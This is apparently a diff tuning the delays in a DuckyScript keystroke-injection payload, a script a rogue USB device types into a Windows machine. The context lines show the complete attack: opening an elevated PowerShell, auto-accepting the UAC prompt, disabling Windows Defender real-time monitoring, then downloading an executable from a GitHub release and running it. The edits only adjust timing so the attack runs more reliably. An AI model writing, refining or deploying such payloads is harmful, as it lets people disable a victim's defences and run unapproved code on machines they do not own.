@@ -9,14 +9,14 @@ REM
 REM startup delay
 DELAY 1000
 GUI r
-DELAY 200
+DELAY 300
 STRING powershell Start-Process powershell -Verb runAs
 ENTER
-DELAY 1000
+DELAY 1500
 ALT y
-DELAY 500
+DELAY 1000
 STRING Set-MpPreference -DisableRealtimeMonitoring $true
 ENTER
-DELAY 500
+DELAY 700
 STRING $down = New-Object System.Net.WebClient; $url = 'https://github.com/bemxio/mario-head/releases/latest/download/mario_dist.exe'; $file = 'mario_dist.exe'; $down.DownloadFile($url,$file); $exec = New-Object -com shell.application; $exec.shellexecute($file); exit;
 ENTER
